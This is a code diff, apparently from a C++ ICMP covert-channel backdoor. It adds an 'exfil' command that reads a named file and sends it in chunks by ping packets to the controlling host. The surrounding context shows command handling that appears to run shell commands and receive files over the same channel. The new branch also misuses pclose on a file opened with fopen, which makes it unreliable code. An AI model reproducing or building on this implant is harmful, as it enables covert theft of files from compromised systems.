@@ -180,23 +180,25 @@ void parse_command(int sockfd, const std::string &dst, uint8_t *buf, size_t size
         send_ping(sockfd, dst, NULL, 0);
 
         pclose(fp);
-    } 
-    else if (split.at(0).compare("file") == 0) {
+    }
+    else if (split.at(0).compare("file") == 0)
+    {
         std::cout << "copying to file: " << command << "\n";
 
         FILE *fp = fopen(command.c_str(), "wb+");
-        if (fp == NULL) {
+        if (fp == NULL)
+        {
             perror("fopen");
             return;
         }
 
-        while(1)
+        while (1)
         {
             uint8_t in[512];
             std::string src_ip;
             ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
 
-            if (dst != src_ip) 
+            if (dst != src_ip)
             {
                 continue;
             }
@@ -211,6 +213,27 @@ void parse_command(int sockfd, const std::string &dst, uint8_t *buf, size_t size
                 break;
             }
         }
+    }
+    else if (split.at(0).compare("exfil") == 0)
+    {
+        std::cout << "Exfiltrating file: " << command << "\n";
+        FILE *fp = fopen(command.c_str(), "rb");
+        uint8_t out[512];
+        if (fp == NULL)
+        {
+            return;
+        }
+
+        size_t nbytes;
+        do
+        {
+            nbytes = fread(out, 1, sizeof(out), fp);
+            send_ping(sockfd, dst, out, nbytes);
+        } while (nbytes != 0);
+
+        send_ping(sockfd, dst, NULL, 0);
+
+        pclose(fp);
     }
 }
 
@@ -248,7 +271,8 @@ int main(int argc, char **argv)
     }
 
     const size_t len = strnlen(opt, IFNAMSIZ);
-    if (len == IFNAMSIZ) {
+    if (len == IFNAMSIZ)
+    {
         std::fputs("Too long iface name", stderr);
         exit(-1);
     }
